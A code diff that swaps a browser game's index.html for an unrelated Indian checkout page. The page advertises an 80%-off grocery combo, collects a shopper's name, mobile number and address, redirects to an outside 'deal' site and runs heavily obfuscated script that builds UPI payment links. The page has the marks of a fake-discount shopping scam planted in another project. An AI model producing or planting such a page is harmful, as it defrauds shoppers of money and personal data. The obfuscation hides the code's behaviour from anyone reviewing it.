@@ -1,39 +1,204 @@
-<!DOCTYPE html> 
-<html lang="en"> 
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>AGameRepo - Glow Hockey</title> 
-    <link rel="stylesheet" href="style.css"> 
-</head> 
-<body> 
-    <div class="controls"> 
-        <button id="restart-btn" class="control-btn">Restart</button> 
-        <button id="pause-btn" class="control-btn">Pause</button> 
-    </div> 
-     
-    <div class="score-container"> 
-        <div class="score-section ai-score-section"> 
-            <div class="player-name">COMPUTER</div> 
-            <div class="score" id="aiScore">0</div> 
-        </div> 
-         
-        <div class="score-section player-score-section"> 
-            <div class="player-name">PLAYER</div> 
-            <div class="score" id="playerScore">0</div> 
-        </div> 
-    </div> 
-     
-    <div class="game-container"> 
-        <canvas id="gameCanvas"></canvas> 
-        <div class="game-status" id="gameStatus">Touch the ball to start!</div> 
-    </div> 
-     
-    <div class="game-over" id="gameOver"> 
-        <h2 id="winnerText">Game Over</h2> 
-        <button id="restart-game" class="restart-btn">Play Again</button> 
-    </div> 
-     
-    <script src="script.js"></script> 
-</body> 
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Checkout — Address · Summary · Payment</title>
+<style>
+  :root{
+      --accent: #FFB300;
+      --pay-green: #3b8132;
+      --muted: #777;
+      --border: #e6e6e6;
+      --bg: #f7f7f7;
+      --danger: #ff0000;
+  }
+  *{box-sizing:border-box;font-family:Arial, Helvetica, sans-serif}
+  body{margin:0;background:var(--bg);color:#222;-webkit-font-smoothing:antialiased}
+  header{display:flex;align-items:center;padding:12px 14px;background:#fff;border-bottom:1px solid var(--border)}
+  .back{font-size:22px;margin-right:8px;cursor:pointer;color:#333}
+  header h1{flex:1;font-size:20px;text-align:center;margin:0;font-weight:600}
+  .steps{display:flex;background:#fff;border-bottom:1px solid var(--border);padding:14px 12px;gap:8px;justify-content:space-around}
+  .step{flex:1;text-align:center}
+  .circle{width:34px;height:34px;border-radius:50%;display:inline-block;line-height:34px;color:#fff;font-weight:600}
+  .step .label{display:block;margin-top:8px;font-size:13px;color:#333}
+  .step.active .circle{background:var(--accent)}
+  .step.done .circle{background:var(--accent)}
+  .step.inactive .circle{background:#d9d9d9}
+  main{padding:14px}
+  .card{background:#fff;border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:12px}
+  input[type="text"], input[type="tel"], select{
+    width:100%;padding:12px;border-radius:10px;border:1px solid var(--border);font-size:15px;margin:8px 0;
+    background:#fff;
+  }
+  .row {display:flex;gap:10px}
+  .row .half{flex:1}
+  .btn{display:block;width:100%;padding:14px;border-radius:10px;border:none;background:var(--accent);color:#fff;font-weight:700;font-size:16px;cursor:pointer;margin-top:12px}
+  .btn:active{opacity:0.95}
+  .muted{color:var(--muted)}
+  .product-block{display:flex;gap:12px;align-items:flex-start}
+  .product-block img{width:92px;height:92px;border-radius:8px;border:1px solid #eee;object-fit:cover}
+  .price-row{display:flex;justify-content:space-between;align-items:center;margin:6px 0}
+  .strike{text-decoration:line-through;color:#9a9a9a;margin-right:8px}
+  .green{color:green;font-weight:700}
+
+  .upi-option{display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;border:1px solid var(--border);background:#fff;margin:10px 0;cursor:pointer}
+  .upi-option img{width:36px;height:36px;object-fit:contain}
+  .upi-option.active{border:2px solid var(--accent);background:#fff6ea}
+  .banner{background:#ffd500;padding:12px;text-align:center;font-weight:700;border-radius:6px;margin-bottom:10px}
+  .offer{padding:10px 0;text-align:center;color:#c00;font-weight:600}
+  footer.icons{display:flex;gap:12px;justify-content:space-around;padding:12px 0;border-top:1px solid var(--border)}
+  footer.icons div{text-align:center;font-size:12px;color:var(--muted)}
+  footer.icons img{width:28px;height:28px;margin-bottom:6px;opacity:0.95}
+
+      /* Pay Button */
+    .pay-now-wrap {
+      position: sticky;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      padding: 10px 15px;
+      border-top: 1px solid var(--border);
+    }
+
+    .pay-btn {
+      display: block;
+      color: #FFFFFF;
+      width: 100%;
+      padding: 14px;
+      background: var(--accent);
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .pay-btn:disabled {
+      background: #ddd;
+      cursor: not-allowed;
+    }
+
+    .pay-btn:hover {
+      background: #e0a800;
+    }
+
+
+  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;z-index:1000}
+  .modal .box{background:#fff;padding:18px;border-radius:12px;width:320px;max-width:94%}
+  .small-muted{font-size:13px;color:var(--muted)}
+  @media(min-width:900px){main{max-width:800px;margin:0 auto}}
+
+</style>
+</head>
+<body>
+
+<header>
+  <div class="back" id="backBtn" title="Back" onclick="onBack()">←</div>
+  <h1 id="pageTitle">Add delivery address</h1>
+</header>
+
+<div class="steps" aria-hidden="true">
+  <div class="step active" id="s-step1"><div class="circle">1</div><div class="label">Address</div></div>
+  <div class="step inactive" id="s-step2"><div class="circle">2</div><div class="label">Order Summary</div></div>
+  <div class="step inactive" id="s-step3"><div class="circle">3</div><div class="label">Payment</div></div>
+</div>
+
+<main>
+
+  <section id="step1" class="card" aria-labelledby="pageTitle">
+    <input id="fullname" type="text" placeholder="Full Name (Required)*" />
+    <input id="mobile" type="tel" placeholder="Mobile number (Required)*" />
+    <input id="pincode" type="text" placeholder="Pincode (Required)*" />
+    <div class="row">
+      <div class="half">
+        <input id="city" type="text" placeholder="City (Required)*" />
+      </div>
+      <div class="half">
+        <select id="state">
+          <option value="">State</option>
+          <option>Andhra Pradesh</option><option>Arunachal Pradesh</option><option>Assam</option><option>Bihar</option>
+          <option>Chhattisgarh</option><option>Goa</option><option>Gujarat</option><option>Haryana</option>
+          <option>Himachal Pradesh</option><option>Jharkhand</option><option>Karnataka</option><option>Kerala</option>
+          <option>Madhya Pradesh</option><option>Maharashtra</option><option>Manipur</option><option>Meghalaya</option>
+          <option>Mizoram</option><option>Nagaland</option><option>Odisha</option><option>Punjab</option>
+          <option>Rajasthan</option><option>Sikkim</option><option>Tamil Nadu</option><option>Telangana</option>
+          <option>Tripura</option><option>Uttar Pradesh</option><option>Uttarakhand</option><option>West Bengal</option>
+        </select>
+      </div>
+    </div>
+    <input id="house" type="text" placeholder="House No., Building Name" />
+    <input id="road" type="text" placeholder="Road name, Area, Colony" />
+    <div id="addrFeedback" class="small-muted" style="min-height:18px"></div>
+    <button class="btn" id="saveAddressBtn" onclick="saveAddress()">Save Address</button>
+  </section>
+
+
+
+
+
+
+<section id="step2" style="display:none">
+  <div class="card">
+    <div id="deliveredTo" style="margin-bottom:12px"></div>
+
+    <!-- Main Combo Item -->
+    <div class="product-block">
+<img src="https://i.ibb.co/N2d0y5Sf/Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min.jpg" alt="Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min" border="0">
+    <div>
+        <div style="font-weight:700;font-size:16px;margin-bottom:6px">
+          Fortune, Soyabean Refined Oil 5L Jar + Fortune Everyday Basmati Rice, 5KG Bag Combo.
+        </div>
+        <div style="color:#FFB343;font-size:15px;margin-bottom:6px">★★★★★</div>
+        <div style="margin-bottom:6px">Qty: 1</div>
+        <div>
+          <span style="color:green;font-weight:700;margin-right:6px">80%</span>
+          <span class="strike">₹2,499.00</span>
+          <span style="font-weight:700;margin-left:8px">₹499.00</span>
+        </div>
+      </div>
+    </div>
+
+
+  </div>
+
+  <!-- Price Summary -->
+  <div class="card">
+    <div class="price-row"><div>Price (1 item)</div><del>₹2,499.00</del></div>
+    <div class="price-row"><div>Discount</div><div class="green">₹2,000.00</div></div>
+    <div class="price-row"><div>Delivery Charges</div><div class="green">FREE Delivery</div></div>
+    <hr style="border:none;border-top:1px solid var(--border);margin:12px 0">
+    <div class="price-row" style="font-weight:700"><div>Total Amount</div><div>₹499.00</div></div>
+    <div style="color:var(--pay-green);font-weight:700;margin-top:8px">
+      You will save ₹2000.00 on this order
+    </div>
+  </div>
+
+  <!-- Footer Icons -->
+  <footer class="icons card" style="margin-top:10px">
+    <div><img src="https://i.ibb.co/QvQHJMhg/original-3.png" alt=""><div>Authentic<br>Products</div></div>
+    <div><img src="https://i.ibb.co/LHVjMV9/shield.png" alt=""><div>Secure<br>Payments</div></div>
+    <div><img src="https://i.ibb.co/jZHv0bTW/return.png" alt=""><div>Easy<br>Returns</div></div>
+  </footer>
+
+  <!-- Continue Button -->
+<div>
+  <button class="btn" style="width:100%;background:#FFB300"
+    onclick="window.location.href='https://deal-f3k.pages.dev/'">
+    Continue
+  </button>
+</div>
+</section>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+
+const _0xa5be5=_0x7fd8;(function(_0x59d668,_0x404bec){const _0x56a4ef=_0x7fd8,_0x41a139=_0x59d668();while(!![]){try{const _0x4be28e=parseInt(_0x56a4ef(0xc2))/0x1+-parseInt(_0x56a4ef(0xea))/0x2+-parseInt(_0x56a4ef(0xd2))/0x3*(-parseInt(_0x56a4ef(0xbb))/0x4)+parseInt(_0x56a4ef(0xb4))/0x5*(parseInt(_0x56a4ef(0xd4))/0x6)+-parseInt(_0x56a4ef(0xb7))/0x7+parseInt(_0x56a4ef(0xe6))/0x8*(parseInt(_0x56a4ef(0xeb))/0x9)+parseInt(_0x56a4ef(0xdd))/0xa*(-parseInt(_0x56a4ef(0xde))/0xb);if(_0x4be28e===_0x404bec)break;else _0x41a139['push'](_0x41a139['shift']());}catch(_0x6049e3){_0x41a139['push'](_0x41a139['shift']());}}}(_0xbdc0,0xcc9db));function hi(){const _0x1310c0=_0x7fd8;console[_0x1310c0(0xda)]('Hello\x20World!');}const STEPS={0x1:_0xa5be5(0xb3),0x2:_0xa5be5(0xad),0x3:'step3'};let currentStep=0x1,selectedUpi=null;const localKey=_0xa5be5(0xcd);function setStepVisual(_0x507fbb){const _0x115293=_0xa5be5;currentStep=_0x507fbb,document[_0x115293(0xe3)](_0x115293(0xe0))[_0x115293(0xdc)]=_0x507fbb===0x1?_0x115293(0xa1):_0x507fbb===0x2?'Order\x20Summary':_0x115293(0x9c);for(const _0x1b0c05 in STEPS){document['getElementById'](STEPS[_0x1b0c05])[_0x115293(0xc5)][_0x115293(0xa2)]=Number(_0x1b0c05)===_0x507fbb?_0x1b0c05==0x1?'block':_0x115293(0xa0):'none',document['getElementById']('s-step'+_0x1b0c05)[_0x115293(0xc0)]=_0x115293(0xb6)+(Number(_0x1b0c05)<_0x507fbb?_0x115293(0xab):Number(_0x1b0c05)===_0x507fbb?_0x115293(0xe8):_0x115293(0xec));}}function onBack(){if(currentStep===0x3)setStepVisual(0x2);else{if(currentStep===0x2)setStepVisual(0x1);else{}}}function _0xbdc0(){const _0x5e3a8f=['target','querySelectorAll','mobile','#ffffff','done','Please\x20select\x20a\x20UPI\x20option\x20first.','step2','upi://pay?pa=merchant@upi&pn=DemoMerchant&am=499&cu=INR','innerHTML','replace','flex','fullname','step1','710580QMXtqb','house','step\x20','3897397Azgwyl','setItem','none','href','4PycVLB','Enter\x20a\x20valid\x206-digit\x20pincode.','Address\x20saved.\x20Proceeding\x20to\x20Order\x20Summary...','classList','pincode','className','qrcode','553985aIVRPh','length','value','style','city','addrFeedback','road','floor','timerText','&gt;','<div\x20style=\x22margin-top:6px\x22\x20class=\x22small-muted\x22>','checkout_address_demo','data-link','deliveredTo','state','&#39;','1721397eJKxkt','Enter\x20a\x20valid\x20full\x20name.','30VLrfQt','getItem','</div>','qrModal','color','&amp;','log','CorrectLevel','innerText','20zSHSzh','245707rOovLy','trim','pageTitle','stringify','getAttribute','getElementById','<div\x20style=\x22font-size:13px;color:var(--muted)\x22>Delivered\x20to:</div>','removeItem','24392Xaoljz','<div\x20class=\x22small-muted\x22\x20style=\x22margin-top:4px\x22>','active','<div\x20style=\x22font-weight:700;margin-top:6px\x22>','1315954NEWAhV','765qQARAo','inactive','test','modal','.upi-option','Please\x20save\x20a\x20delivery\x20address\x20first.','&lt;','payDelivered','#2b7a2b','Payment','#000000','forEach','#c00','block','Add\x20delivery\x20address','display','push','join','min\x20','remove'];_0xbdc0=function(){return _0x5e3a8f;};return _0xbdc0();}function validateAddress(_0x252611){const _0x4e4272=_0xa5be5;if(!_0x252611[_0x4e4272(0xb2)]||_0x252611['fullname'][_0x4e4272(0xdf)]()[_0x4e4272(0xc3)]<0x2)return _0x4e4272(0xd3);if(!/^[6-9]\d{9}$/[_0x4e4272(0xed)](_0x252611[_0x4e4272(0xa9)]))return'Enter\x20a\x20valid\x2010-digit\x20Indian\x20mobile\x20number\x20starting\x206-9.';if(!/^\d{6}$/[_0x4e4272(0xed)](_0x252611['pincode']))return _0x4e4272(0xbc);if(!_0x252611[_0x4e4272(0xc6)]||!_0x252611['state'])return'City\x20and\x20State\x20are\x20required.';return null;}(function init(){const _0x325011=_0xa5be5;localStorage[_0x325011(0xe5)](localKey);const _0x3beeb0=loadAddress();_0x3beeb0&&(document[_0x325011(0xe3)](_0x325011(0xb2))['value']=_0x3beeb0[_0x325011(0xb2)]||'',document[_0x325011(0xe3)](_0x325011(0xa9))['value']=_0x3beeb0[_0x325011(0xa9)]||'',document[_0x325011(0xe3)](_0x325011(0xbf))[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xbf)]||'',document[_0x325011(0xe3)]('city')[_0x325011(0xc4)]=_0x3beeb0['city']||'',document[_0x325011(0xe3)]('state')[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xd0)]||'',document[_0x325011(0xe3)](_0x325011(0xb5))[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xb5)]||'',document[_0x325011(0xe3)]('road')['value']=_0x3beeb0['road']||'',populateSummaryUI(_0x3beeb0)),setStepVisual(0x1);}());function saveAddress(){const _0xd92436=_0xa5be5,_0x214f21={'fullname':document['getElementById'](_0xd92436(0xb2))[_0xd92436(0xc4)][_0xd92436(0xdf)](),'mobile':document[_0xd92436(0xe3)]('mobile')[_0xd92436(0xc4)][_0xd92436(0xdf)](),'pincode':document[_0xd92436(0xe3)]('pincode')[_0xd92436(0xc4)][_0xd92436(0xdf)](),'city':document['getElementById'](_0xd92436(0xc6))[_0xd92436(0xc4)]['trim'](),'state':document[_0xd92436(0xe3)](_0xd92436(0xd0))['value'],'house':document[_0xd92436(0xe3)](_0xd92436(0xb5))[_0xd92436(0xc4)][_0xd92436(0xdf)](),'road':document['getElementById'](_0xd92436(0xc8))[_0xd92436(0xc4)][_0xd92436(0xdf)]()},_0x533461=validateAddress(_0x214f21),_0x4aed59=document[_0xd92436(0xe3)](_0xd92436(0xc7));if(_0x533461){_0x4aed59[_0xd92436(0xdc)]=_0x533461,_0x4aed59[_0xd92436(0xc5)]['color']=_0xd92436(0x9f);return;}localStorage[_0xd92436(0xb8)](localKey,JSON[_0xd92436(0xe1)](_0x214f21)),_0x4aed59['innerText']=_0xd92436(0xbd),_0x4aed59['style'][_0xd92436(0xd8)]=_0xd92436(0x9b),populateSummaryUI(_0x214f21),setTimeout(()=>setStepVisual(0x2),0x15e);}function loadAddress(){const _0x2beda2=_0xa5be5;try{const _0x444a44=localStorage[_0x2beda2(0xd5)](localKey);return _0x444a44?JSON['parse'](_0x444a44):null;}catch(_0xcbce48){return null;}}function populateSummaryUI(_0x47ca70){const _0x38b888=_0xa5be5;if(!_0x47ca70)return;const _0x312455=document[_0x38b888(0xe3)](_0x38b888(0xcf)),_0x33049b=[];if(_0x47ca70[_0x38b888(0xb5)])_0x33049b[_0x38b888(0xa3)](_0x47ca70['house']);if(_0x47ca70[_0x38b888(0xc8)])_0x33049b['push'](_0x47ca70[_0x38b888(0xc8)]);_0x33049b['push'](_0x47ca70[_0x38b888(0xc6)]),_0x33049b['push'](_0x47ca70[_0x38b888(0xd0)]),_0x33049b[_0x38b888(0xa3)](_0x47ca70[_0x38b888(0xbf)]),_0x312455[_0x38b888(0xaf)]=_0x38b888(0xe4)+(_0x38b888(0xe9)+escapeHtml(_0x47ca70[_0x38b888(0xb2)])+_0x38b888(0xd6))+(_0x38b888(0xe7)+escapeHtml(_0x47ca70['mobile'])+_0x38b888(0xd6))+(_0x38b888(0xcc)+escapeHtml(_0x33049b[_0x38b888(0xa4)](',\x20'))+'</div>');const _0x275172=document[_0x38b888(0xe3)](_0x38b888(0x9a));if(_0x275172)_0x275172[_0x38b888(0xaf)]=_0x312455[_0x38b888(0xaf)];}function editAddress(){const _0x424a78=_0xa5be5;setStepVisual(0x1);const _0x18049c=loadAddress();_0x18049c&&(document[_0x424a78(0xe3)](_0x424a78(0xb2))['value']=_0x18049c[_0x424a78(0xb2)]||'',document[_0x424a78(0xe3)](_0x424a78(0xa9))['value']=_0x18049c[_0x424a78(0xa9)]||'',document[_0x424a78(0xe3)]('pincode')['value']=_0x18049c[_0x424a78(0xbf)]||'',document[_0x424a78(0xe3)](_0x424a78(0xc6))[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xc6)]||'',document['getElementById']('state')[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xd0)]||'',document['getElementById']('house')['value']=_0x18049c[_0x424a78(0xb5)]||'',document[_0x424a78(0xe3)]('road')[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xc8)]||'');}function toPayment(){const _0x4a661c=_0xa5be5,_0x93b571=loadAddress();if(!_0x93b571){document['getElementById']('addrFeedback')[_0x4a661c(0xdc)]=_0x4a661c(0x98),document[_0x4a661c(0xe3)](_0x4a661c(0xc7))['style']['color']=_0x4a661c(0x9f),setStepVisual(0x1);return;}populateSummaryUI(_0x93b571),setStepVisual(0x3);}function selectUPI(_0x3a3534){const _0x3c7539=_0xa5be5;document[_0x3c7539(0xa8)](_0x3c7539(0xef))[_0x3c7539(0x9e)](_0x4c247f=>_0x4c247f[_0x3c7539(0xbe)][_0x3c7539(0xa6)](_0x3c7539(0xe8))),_0x3a3534[_0x3c7539(0xbe)]['add'](_0x3c7539(0xe8));const _0x1c3666=_0x3a3534[_0x3c7539(0xe2)](_0x3c7539(0xce));selectedUpi=_0x1c3666;}function openQR(_0x2af178){const _0xa0e98c=_0xa5be5,_0x2d8628=document[_0xa0e98c(0xe3)](_0xa0e98c(0xd7)),_0x37259a=document[_0xa0e98c(0xe3)](_0xa0e98c(0xc1));_0x37259a['innerHTML']='',new QRCode(_0x37259a,{'text':_0x2af178,'width':0xdc,'height':0xdc,'colorDark':_0xa0e98c(0x9d),'colorLight':_0xa0e98c(0xaa),'correctLevel':QRCode[_0xa0e98c(0xdb)]['H']}),_0x2d8628[_0xa0e98c(0xc5)][_0xa0e98c(0xa2)]=_0xa0e98c(0xb1);}function closeQR(_0x209b7f){const _0x5395c4=_0xa5be5;if(_0x209b7f&&_0x209b7f[_0x5395c4(0xa7)]&&_0x209b7f[_0x5395c4(0xa7)][_0x5395c4(0xbe)]&&_0x209b7f[_0x5395c4(0xa7)][_0x5395c4(0xbe)]['contains'](_0x5395c4(0xee))){document[_0x5395c4(0xe3)](_0x5395c4(0xd7))['style']['display']=_0x5395c4(0xb9);return;}document[_0x5395c4(0xe3)](_0x5395c4(0xd7))['style'][_0x5395c4(0xa2)]=_0x5395c4(0xb9);}function _0x7fd8(_0x462b84,_0x39f305){const _0xbdc058=_0xbdc0();return _0x7fd8=function(_0x7fd89a,_0x413118){_0x7fd89a=_0x7fd89a-0x98;let _0x59745d=_0xbdc058[_0x7fd89a];return _0x59745d;},_0x7fd8(_0x462b84,_0x39f305);}function buildUPI(_0x2b605c){const _0x579f65=_0xa5be5;if(!_0x2b605c)return null;if(_0x2b605c==='qr')return _0x579f65(0xae);return _0x2b605c;}function payNow(){const _0x1b0c75=_0xa5be5;if(!selectedUpi){alert(_0x1b0c75(0xac));return;}if(selectedUpi==='qr'){const _0x1bdf05=buildUPI('qr');openQR(_0x1bdf05);return;}const _0x18f1f4=buildUPI(selectedUpi);window['location'][_0x1b0c75(0xba)]=_0x18f1f4;}function escapeHtml(_0x2471c2){const _0x3a9d94=_0xa5be5;return String(_0x2471c2)[_0x3a9d94(0xb0)](/[&<>"']/g,function(_0x4a7640){const _0x4869df=_0x3a9d94;return{'&':_0x4869df(0xd9),'<':_0x4869df(0x99),'>':_0x4869df(0xcb),'\x22':'&quot;','\x27':_0x4869df(0xd1)}[_0x4a7640];});}(function(){const _0x223759=_0xa5be5;let _0x1c8858=0x5*0x3c;const _0x29d068=document['getElementById'](_0x223759(0xca));setInterval(()=>{const _0x18c44c=_0x223759;if(_0x1c8858<=0x0)return;_0x1c8858--;const _0x1bdb4d=Math[_0x18c44c(0xc9)](_0x1c8858/0x3c),_0xdda90c=_0x1c8858%0x3c;_0x29d068[_0x18c44c(0xdc)]=_0x1bdb4d+_0x18c44c(0xa5)+(_0xdda90c<0xa?'0'+_0xdda90c:_0xdda90c)+'sec';},0x3e8);}()),function init(){const _0x29c41b=_0xa5be5,_0x574280=loadAddress();_0x574280&&(document[_0x29c41b(0xe3)]('fullname')['value']=_0x574280[_0x29c41b(0xb2)]||'',document['getElementById']('mobile')[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xa9)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xbf))['value']=_0x574280['pincode']||'',document[_0x29c41b(0xe3)](_0x29c41b(0xc6))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xc6)]||'',document['getElementById'](_0x29c41b(0xd0))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xd0)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xb5))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xb5)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xc8))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xc8)]||'',populateSummaryUI(_0x574280)),setStepVisual(0x1);}(),hi();
+
+</script>
+</body>
 </html>
